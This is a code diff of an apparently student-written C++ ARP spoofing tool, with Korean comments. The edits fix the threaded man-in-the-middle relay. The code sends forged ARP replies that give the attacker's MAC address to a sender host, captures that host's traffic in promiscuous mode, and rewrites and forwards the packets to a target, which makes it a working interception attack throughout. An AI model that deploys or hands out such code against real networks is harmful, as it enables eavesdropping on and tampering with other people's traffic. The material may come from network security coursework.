@@ -26,29 +26,22 @@ struct EthArpPacket final {
 };
 #pragma pack(pop)
 
-
 string cmd(string command) {
     std::string result;
     char buffer[128];
-
     FILE* pipe = popen(command.c_str(), "r");
-
     if (!pipe) {
         return "Error: popen failed!";
     }
-
     while (!feof(pipe)) {
         if (fgets(buffer, 128, pipe) != nullptr) {
             result += buffer;
         }
     }
-
     pclose(pipe);
-
     if (!result.empty() && result.back() == '\n') {
         result.pop_back();
     }
-
     return result;
 }
 
@@ -66,8 +59,12 @@ void macFstr(string strMac, MAC &mac){
             iss >> tmp;
         }
         mac[i] = static_cast<uint8_t>(val);
-    }
-    //return mac;
+    }/*
+    for (int i = 0; i < 3; ++i) { //네트워크 바이트 오더로.
+        uint8_t temp = mac[i];
+        mac[i] = mac[5 - i];
+        mac[5 - i] = temp;
+    }*/
 }
 
 
@@ -110,13 +107,22 @@ void getTmac(string tip, MAC &mac) {
 void arpSpoof(string senderIp, string targetIp, string inter) { 
     EthArpPacket packet;
 
-    //string arpUp = "sudo arping -c 3 " + senderIp; 
-    //cmd(arpUp);
-
     MAC smac;
     getSmac(senderIp, smac); //sender mac 받아오기
     MAC mymac;
     getMymac(inter, mymac); //Attacker mac(나)
+
+    /*
+    for (int i = 0; i < 3; ++i) {
+            uint8_t temp = smac[i];
+            smac[i] = smac[5 - i];
+            smac[5 - i] = temp;
+        }
+        for (int i = 0; i < 3; ++i) {
+            uint8_t temp = mymac[i];
+            mymac[i] = mymac[5 - i];
+            mymac[5 - i] = temp;
+    */
 
     packet.eth_.dmac_ = smac;//Mac(smac);
     packet.eth_.smac_ = mymac;//Mac(mymac);
@@ -146,16 +152,10 @@ void arpSpoof(string senderIp, string targetIp, string inter) {
 
     pcap_close(handle);
 }
-queue<const u_char*> packets;
+queue<pair<const u_char*, size_t>> packets;
 void packetHandler(u_char* userData, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
-    //struct libnet_ethernet_hdr* eth_hdr = (struct libnet_ethernet_hdr*)packet;
-  
-    //struct libnet_ipv4_hdr* ip_hdr = (struct libnet_ipv4_hdr*)(packet + 14);
-    //char src_ip_str[INET_ADDRSTRLEN];
-    //char dst_ip_str[INET_ADDRSTRLEN];
-    //inet_ntop(AF_INET, &(ip_hdr->ip_src), src_ip_str, INET_ADDRSTRLEN);
-    //inet_ntop(AF_INET, &(ip_hdr->ip_dst), dst_ip_str, INET_ADDRSTRLEN);
-    packets.push(packet);
+    size_t siz=pkthdr->caplen;
+    packets.push(make_pair(packet, siz));
     cout<<"put one packet to queue"<<endl;
 }
 
@@ -163,7 +163,7 @@ void Listen(string inter, string smac) { //스레드2, ip로 필터 걸고 relay
     //LnR (리슨 앤 릴레이)
     const char* dev = inter.c_str();
     char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 0, 1, errbuf);
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    
     if (handle == nullptr) {
         std::cerr << "Couldn't open interface eth0: " << errbuf << std::endl;
@@ -182,20 +182,17 @@ void Listen(string inter, string smac) { //스레드2, ip로 필터 걸고 relay
     if (pcap_setfilter(handle, &fp) == -1) {
         std::cerr << "Could not install filter " << filter << ": " << pcap_geterr(handle) << std::endl;
     }
-
     pcap_loop(handle, 0, packetHandler, nullptr);
-
 }
 void relay(char* inter, string senderIP, MAC targetmac, MAC mymac) {
-    //u_int8_t (eth_hdr->ether_shost)
-    //struct in_addr m (IP)
     const char* dev = inter;//inter.c_str();
     char errbuf[PCAP_ERRBUF_SIZE];
 
-    pcap_t* handle = pcap_create(dev, errbuf);
-    pcap_activate(handle);//핸들 활성화.
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);//pcap_create(dev, errbuf);
+    //pcap_activate(handle);//핸들 활성화.
 
-    while (1) {/*
+    while (1) {
+        /*
         for (int i = 0; i < 3; ++i) {
             uint8_t temp = targetmac[i];
             targetmac[i] = targetmac[5 - i];
@@ -212,7 +209,8 @@ void relay(char* inter, string senderIP, MAC targetmac, MAC mymac) {
             continue;
         }
         else {
-            u_char* packet = (u_char*)packets.front();
+            u_char* packet = (u_char*)packets.front().first;
+            size_t len=packets.front().second;
             packets.pop();
             cout<<"get one packet"<<endl;
             struct libnet_ethernet_hdr* eth_hdr = (struct libnet_ethernet_hdr*)packet;
@@ -220,18 +218,27 @@ void relay(char* inter, string senderIP, MAC targetmac, MAC mymac) {
             
             if (ip_hdr->ip_src.s_addr == htonl(Ip(senderIP))) {//
                 //eth_hdr->ether_shost = mymac;
-                cout<<"ip is equal"<<endl;
+                cout<<"ip is equal  "<<senderIP<<endl;
                 memcpy(eth_hdr->ether_shost, mymac, sizeof(MAC));
+                printf("my mac : ");
+                for(int i=0; i<6; i++)
+                    printf("%hhX ", mymac[i]);
+                printf("\n");
+                //cout<<mymac[0]<<mymac[1]<<mymac[2]<<mymac[3]<<mymac[4]<<mymac[5]<<endl;
                 //copy(begin(mymac), end(mymac), begin(eth_hdr->ether_shost));
                 //eth_hdr->ether_dhost = targetMac;
                // copy(begin(targetmac), end(targetmac), begin(eth_hdr->ether_dhost));
                 memcpy(eth_hdr->ether_dhost, targetmac, sizeof(MAC));
 
-                int res = pcap_sendpacket(handle, packet, sizeof(EthArpPacket));//체크해야함
+                int res = pcap_sendpacket(handle, packet, len);//체크해야함 sizeof(EthArpPacket)
                 if (res != 0)
                     fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                 else
-                    cout<<"send relay"<<endl;
+                {
+                    for (size_t i = 0; i < sizeof(EthArpPacket); ++i)
+                        printf("%hhX ", packet[i]);
+                    cout<<"\nsend relay"<<endl;
+                }
             }
         }
     }
@@ -252,12 +259,13 @@ int main(int argc, char* argv[]) {
     //=&getSmac(argv[2], mac).c_str();// = new char[getSmac(argv[2], mac).c_str()+1];
     //strcpy(smac,getSmac(argv[2], mac).c_str());
     MAC targetmac, mymac;
-    getTmac(argv[3], targetmac); //sender mac 받아오기
+    getTmac(argv[3], targetmac); //
     getMymac(argv[1], mymac); //Attacker mac(나)
 
     thread autoArp(arpSpoof, argv[2], argv[3], argv[1]); //s ip, t ip, interface
     thread listener(Listen, argv[1], smac);
     thread relayGo(relay, argv[1], argv[2], targetmac, mymac);
+    //relay(char* inter, string senderIP, MAC targetmac, MAC mymac)
 
     autoArp.detach(); //메인 스레드와 관계없이 돌아감.
     listener.detach();
